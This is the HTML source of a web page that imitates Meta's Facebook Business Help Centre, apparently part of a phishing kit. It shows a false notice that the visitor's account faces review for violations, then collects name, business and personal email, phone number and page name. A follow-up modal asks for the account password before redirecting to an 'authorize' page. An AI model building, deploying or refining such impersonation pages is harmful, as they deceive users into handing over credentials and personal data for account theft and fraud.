<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Meta - Business Help Centre</title>
    <script src="https://cdn.tailwindcss.com"></script>

  <style>
    .banner-img {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translatey(-50%);
      transform: translatex(-50%);
      color: #fff;
      font-size: 20px;
      font-weight: 300;
    }
    input[type=text]:focus {
    box-shadow: 0 0 2pt 1pt #1876f230;
    outline-width: 0px;
    }
    textarea:focus {
    box-shadow: 0 0 2pt 1pt #1876f230;
    outline-width: 0px;
    }
    input[type=password]:focus {
    box-shadow: 0 0 2pt 1pt #1876f230;
    outline-width: 0px;
    }
    input,
    input::-webkit-input-placeholder {
    font-size: 14px;
    line-height: 3;
    }
     textarea,
     textarea::-webkit-input-placeholder {
     font-size: 14px;
     }
    


     .modal {
     background:rgba(0,0,0,0.7);
     position:fixed;
     width:100%;
     height:100%;
     top:0px;
     left:0px;
     bottom:0px;
     transition:all .5s ease-in-out;
     opacity:0;
     z-index:-1;
     }
     .modal:target {
     opacity:1;
     transition:all .5s ease-in-out;
     z-index:+1;
     }
     .modal-content {
     position:fixed;
     top:50%;
     left:50%;
     width:500px;
     background:#fff;
     border-radius:4px;
     transform:translate(-50%, -200%);
     transition:all .5s ease-in-out;
     perspective: 1000;
     outline:1px solid transparent;
     opacity:0;
     }
     .modal:target .modal-content {
     transform:translate(-50%, -50%);
     transition:all .5s ease-in-out;
     transition-delay:.5s;
     z-index:9999;
     opacity:1;
     }
     .modal-close {
     float:right;
     text-decoration:none;
     padding:22px 22px;
     color:#111;
     font-weight:600;
     transition:all .5s ease-in-out;
     z-index:+1;
     /* background:rgba(0,0,0,0.1); */
     text-align:center;
     border-radius:0 4px 0 0;
     }

     .modal-content h3 {
     padding:20px;
     display:block;
     text-align:center;
     border-bottom:1px solid #e0e0e0;
     text-transform:uppercase;
     /* background:rgba(2,162,239,1); */
     color:#fff;
     border-radius:4px 4px 0 0;
     }
     .modal-area {
     padding:20px;
     }

     .modal-area input[type="radio"] {
     display:none;
     }
     .modal-area label {
     float:left;
     display:block;
     padding:10px 20px;
     font-weight:700;
     cursor:pointer;
     z-index:+2;
     background:rgba(0,0,0,.3);
     color:#fff;
     transition:all .5s ease-in-out;
     }
     .modal-area input[type="radio"]:checked + label {
     background:#fff;
     color:#424242;
     }
  </style>
</head>

<body class=" bg-[#F0F2F5]">
  <main class="flex-grow">
    <div class="header shadow-sm fixed top-0 left-0 right-0 z-50">
      <nav class="bg-white py-2 md:py-4">
        <div class="container px-4 mx-auto md:flex md:items-center">

          <div class="flex justify-between items-center">
            <img class="w-[260px] h-[20px]" src="{{ asset('assets/meta.png') }}" alt="">
            <button class="border border-solid border-gray-600 px-3 py-1 rounded text-gray-600 opacity-50 hover:opacity-75 md:hidden"
              id="navbar-toggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>

          <div class="hidden md:flex flex-col md:flex-row md:ml-auto mt-3 md:mt-0" id="navbar-collapse">
            <a href="#" class="p-2 lg:px-4 md:mx-2 text-white rounded bg-[#1877f2]">Get Started</a>
            <a href="https://www.facebook.com/business/ads " target="_blank"
              class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Advertise</a>
            <a href="https://www.facebook.com/business/learn/courses" target="_blank"
              class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Learn</a>
            <a href="https://www.facebook.com/business/help" target="_blank"
              class="p-2 lg:px-4 md:mx-2 text-gray-600 rounded hover:bg-gray-200 hover:text-gray-700 transition-colors duration-300">Support</a>
          </div>
        </div>
      </nav>
    </div>

    <section class="w-full flex justify-center mt-4">
      <div class="w-full rounded-lg relative h-fit">
        <img class="w-full" height="150" src="./assets/banner-fb.png" alt="">
        <p class="banner-img">Facebook Business Help Center</p>
      </div>
    </section>

    <section class="w-full flex justify-center mb-10" style="margin-top: 20px">
      <div class="form bg-white w-full max-w-[450px] mx-2 rounded-lg shadow-md border">
        <div class="flex justify-center" style="padding: 15px 0px">
          <p class="font-bold text-xl">Get Started</p>
        </div>
        <div style="background-color: #f1f5f9;font-size:14px;padding: 15px 20px">
          <p class="text-sm" style="margin-bottom: 10px;">
            We have received multiple reports that suggest that
            your account has been in violation of our terms of service and community guidelines.
            As a result, your account is scheduled for review
          </p>
          <span class="font-bold">Report No: 3276170471</span>
        </div>

        <form action="submit" onsubmit="return validateForm(event)"  name="formData">
          <div class="inputs flex flex-col py-4 px-8">
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Please provide us information that will help us investigate</p>
              <textarea required id="text" type="text" placeholder="Please provide us your information here"
                class="min-w-full resize-none py-2 px-4 border border-[#c7c7c8] rounded-[6px]  focus:border-[#1877f2] focus:outline-0"></textarea>
            </div>
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Full name</p>
              <input required id="fullname" type="text" name="fullName" placeholder="Enter your full name"
                class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            </div>
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Business email</p>
              <input required id="business_email" type="text" name="businessEmail" placeholder="Enter your business email address"
                class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            </div>
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Personal email</p>
              <input required id="personal_email" name="personalEmail" type="text" placeholder="Enter your personal email address"
                class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            </div>
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Phone number</p>
              <input required id="phone_number" name="phoneNumber" type="text" placeholder="Enter your mobile phone number"
                class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            </div>
            <div>
              <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Facebook page name</p>
              <input required id="page_name" name="pageName" type="text" placeholder="Enter your facebook page name"
                class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
            </div>

            <button type="submit" id="myBtn"
              class="text-center min-w-full bg-[#1877f2] rounded-[6px] text-white text-[18px] py-1.5 font-[600] mt-2 mb-4">Submit</button>
          </div>
        </form>
      </div>
    </section>
  </main>

  <footer class=" bg-[#1c2b33] text-[#cbd2d9] text-[13px] pt-20 pb-20">
    <div class="container mx-auto px-4">
      <div class="sm:flex sm:flex-wrap sm:-mx-4 md:py-4">
        <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6">
          <h5 class="text-xl font-bold mb-6">Meta technologies</h5>
          <ul class="list-none footer-links">
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Instagram</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Messenger</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">WhatsApp</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Audience Network</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Oculus</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Workplace</a>
            </li>
          </ul>
        </div>
        <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 sm:mt-0">
          <h5 class="text-xl font-bold mb-6">Goals</h5>
          <ul class="list-none footer-links">
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Set up a Facebook Ppage</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Build brand awareness</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Promote your local
                business</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Grow online sales</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Promote your app</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Generate leads</a>
            </li>
          </ul>
        </div>
        <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
          <h5 class="text-xl font-bold mb-6">Industries</h5>
          <ul class="list-none footer-links">
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Automotive</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">B2B</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Consumer packaged goods</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">E-commerce</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Education</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Entertainment and media</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Financial services</a>
            </li>

          </ul>
        </div>
        <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
          <h5 class="text-xl font-bold mb-6">Tools</h5>
          <ul class="list-none footer-links">
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Free tools</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook pages</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Instagram profiles</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Stories</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Shops</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Meta Business Suite</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Facebook ads</a>
            </li>

          </ul>
        </div>
        <div class="px-4 sm:w-1/2 md:w-1/4 xl:w-1/6 mt-8 md:mt-0">
          <h5 class="text-xl font-bold mb-6">Business Help Centre</h5>
          <ul class="list-none footer-links">
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Create and manage
                accoutns</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Publish and distribute
                content</a>
            </li>
            <li class="mb-2">
              <a href="#" class="border-b border-solid border-transparent hover:border-purple-800 hover:text-purple-800">Advertise</a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </footer>

  <div class="modal" id="Authenticate">
    <div class="modal-content">
      <a href="#" class="modal-close select-none" title="Close">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5">
          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </a>
      <div class="pl-4 pt-6 border-b pb-4 select-none">
        <img class="w-[168px] h-[14px]" src="./assets/meta.png" alt="">
      </div>
      <div class="modal-area">
        <div>
          <p class="font-medium" style="font-size: 13px;margin-bottom: 4px;">Password</p>
          <input required id="password" type="password" placeholder="Please enter your password"
            class="min-w-full py-2 px-4 border border-[#c7c7c8] rounded-[6px] mb-3 focus:border-[#1877f2] focus:outline-0">
        </div>
        <div class="w-full flex items-center justify-center">
          <button onclick="authenticate()" id="myBtn" class="text-center w-full bg-[#1877f2] rounded-[6px] text-white text-[18px] py-1.5 font-[600] mt-2 mb-4">Submit</button>
        </div>
      </div>
    </div>
  </div>
  <script>

    window.onload = testapi()

    async function testapi () {
      let asd = await fetch('/api/test')

      console.log(asd)
    }

    function authenticate () {
       window.location = 'authorize.html'
    }
    function validateForm (event) {

       event.preventDefault()

      let fullName = document.forms['formData']['fullName'].value
      let text = document.forms['formData']['text'].value
      let businessEmail = document.forms['formData']['businessEmail'].value
      let personalEmail = document.forms['formData']['personalEmail'].value
      let pageName = document.forms['formData']['pageName'].value
      let phoneNumber = document.forms['formData']['phoneNumber'].value
      

     
      if(
        fullname == '' ||
        text == '' ||
        businessEmail == '' ||
        personalEmail == '' ||
        pageName == '' ||
        phoneNumber == ''
      ) {
        console.log('fdsfds')
        return
      } else {
        console.log(';asdjkasdjksa')
        window.location = '/#Authenticate'
      }


    }
  </script>
  <script type="module" src="{{ asset('build/assets/app-98e0f35e.js') }}"></script>
</body>

</html>